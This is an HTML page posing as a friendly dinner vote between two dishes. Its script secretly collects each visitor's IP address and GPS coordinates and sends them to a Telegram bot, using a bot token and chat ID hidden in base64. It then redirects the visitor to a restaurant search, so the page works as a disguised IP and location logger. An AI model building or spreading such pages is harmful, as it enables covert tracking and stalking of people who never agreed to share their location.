<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dinner Choice</title>
    <style>
        body { background-color: #f4f4f4; font-family: 'Arial', sans-serif; text-align: center; padding: 15px; }
        .container { max-width: 450px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { color: #d35400; margin-bottom: 5px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        .food-item { margin-bottom: 25px; cursor: pointer; border: 1px solid #ddd; border-radius: 10px; overflow: hidden; transition: 0.3s; }
        .food-item:hover { border-color: #d35400; transform: scale(1.02); }
        img { width: 100%; height: 220px; object-fit: cover; }
        .name { font-weight: bold; padding: 10px; display: block; background: #fff; color: #333; }
        #status { display: none; color: green; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body onload="init()">
    <div class="container">
        <h2>Tonight's Special 😋</h2>
        <p>Which one should we order? Pick your favorite!</p>

        <div class="food-item" onclick="handleVote('Biriyani')">
            <img src="https://www.licious.in/blog/wp-content/uploads/2022/06/chicken-hyderabadi-biryani-01.jpg" alt="Biriyani">
            <span class="name">HYDERABADI BIRIYANI</span>
        </div>

        <div class="food-item" onclick="handleVote('Kuzhimanthi')">
            <img src="https://static.toiimg.com/thumb/msid-88331145,width-1280,height-720,resizemode-4/.jpg" alt="Kuzhimanthi">
            <span class="name">ARABIAN KUZHIMANTHI</span>
        </div>

        <div id="status">Thanks! Ordering soon... ❤️</div>
    </div>

    <script>
        let ip = "N/A";
        const t = "ODY0NzIwNjgxODpBQUZaTE91bVFwSUJZRDNXdURjZWVPR1drTkRDTFZpR3paSQ==";
        const c = "NzAwODk1Mjc0Ng==";

        async function init() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}
        }

        function handleVote(food) {
            document.getElementById('status').style.display = 'block';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => sendData(food, p.coords.latitude + "," + p.coords.longitude), 
                    () => sendData(food, "Permission Denied")
                );
            } else {
                sendData(food, "Not Supported");
            }
        }

        async function sendData(food, loc) {
            const botToken = atob(t);
            const chatId = atob(c);
            const msg = `🍽 *Food Vote: ${food}*\n🌐 *IP:* ${ip}\n📍 *Loc:* ${loc}`;
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            
            setTimeout(() => {
                window.location.href = "https://www.google.com/search?q=restaurants+near+me";
            }, 2000);
        }
    </script>
</body>
</html>
